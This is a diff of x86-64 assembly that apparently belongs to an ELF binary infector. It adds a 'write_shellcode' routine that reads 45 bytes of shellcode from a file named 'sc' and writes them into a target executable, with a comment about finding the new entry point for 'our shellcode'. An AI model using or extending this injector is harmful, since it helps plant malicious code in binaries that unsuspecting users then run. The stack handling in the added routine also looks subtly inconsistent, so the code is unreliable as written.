@@ -482,7 +482,7 @@ parse64elfheader:
 	pop rsi
 	pop rdi
 retn
-%define SHELLCODE_LEN 1
+%define SHELLCODE_LEN 45
 ; unsigned long find_new_entry(void *file)
 ; will return the offset to begining of our shellcode
 find_new_entry:
@@ -766,6 +766,36 @@ parse64elfsec:
 	inc rcx
 	jmp loop_print_pad
 	loop_print_pad_end:
+	call write_shellcode
 	add rsp, 8
 	add rsp, 8
 retn
+
+;void write_shellcode(int wfd)
+write_shellcode:
+
+	sub rsp, SHELLCODE_LEN; buffer to read shellcode in
+	;OPEN SC FILE
+	push rdi
+	mov rax, 2
+	push 0x00006373 ; "sc"
+	mov rdi, rsp
+	xor rsi, rsi
+	xor rdx,rdx
+	syscall; open("sc", O_RDONLY); 
+	pop rbx
+	;READ SC FILE
+	mov rdi, rax
+	mov rax, 0
+	lea rsi, [rsp+8]
+	mov rdx, SHELLCODE_LEN
+	syscall; read(sc_fd, buffer, SHELLCODE_LEN);
+	mov rax, 3
+	syscall; close(sc_fd)
+	pop rdi
+	mov rax, 1
+	mov rsi, rsp
+	mov rdx, SHELLCODE_LEN
+	syscall;write(wfd, buffer, SHELLCODE_LEN)
+	add rsp, SHELLCODE_LEN
+retn 	
